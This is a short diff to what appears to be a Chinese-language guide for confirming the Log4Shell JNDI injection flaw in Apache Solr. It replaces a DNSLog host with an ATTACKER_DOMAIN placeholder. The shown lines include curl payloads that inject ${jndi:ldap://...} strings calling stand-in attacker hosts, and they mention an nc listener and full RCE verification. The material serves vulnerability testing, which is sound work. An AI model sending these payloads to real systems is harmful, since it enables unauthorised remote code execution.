@@ -80,7 +80,7 @@ curl "http://target:8983/solr/admin/collections?action=\${jndi:ldap://ATTACKER_I
 # 检查 nc 监听器是否收到连接（收到即确认存在漏洞）
 
 # 方法2: 使用 DNSLog 外带验证
-curl "http://target:8983/solr/admin/cores?action=\${jndi:ldap://RANDOM.dnslog.cn}&wt=json"
+curl "http://target:8983/solr/admin/cores?action=\${jndi:ldap://ATTACKER_DOMAIN}&wt=json"
 # 检查 DNSLog 平台是否有 DNS 解析记录
 
 # 方法3: 完整 RCE 验证（需启动 JNDI 利用服务）
